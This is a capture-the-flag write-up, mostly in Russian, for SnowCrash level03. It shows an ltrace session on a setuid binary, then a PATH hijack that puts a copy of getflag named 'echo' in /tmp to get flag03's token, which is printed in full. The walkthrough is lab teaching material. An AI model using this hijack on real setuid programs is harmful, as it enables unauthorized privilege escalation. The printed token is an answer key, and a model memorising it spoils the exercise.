Бинарник level03 принадлежит пользователю flag03

Видимо что вызывается echo:
```bash
level03@SnowCrash:~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff804, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                                                                      = 2003
geteuid()                                                                                                                                      = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                            = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                            = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                         = 0
+++ exited (status 0) +++
```
Поэтому переопределим echo
```bash
level03@SnowCrash:~$ /usr/bin/getflag
bash: /usr/bin/getflag: No such file or directory
level03@SnowCrash:~$ /usr/sbin/getflag
bash: /usr/sbin/getflag: No such file or directory
level03@SnowCrash:~$ getflag
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level03@SnowCrash:~$ which getflag
/bin/getflag
level03@SnowCrash:~$ cp /bin/getflag /tmp
level03@SnowCrash:~$ cp /bin/getflag /tmp/echo
level03@SnowCrash:~$ /tmp/echo
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level03@SnowCrash:~$ /tmp/echo
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level03@SnowCrash:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
The result token is qi0maab88jeaj46qoumi7maus (for level04)
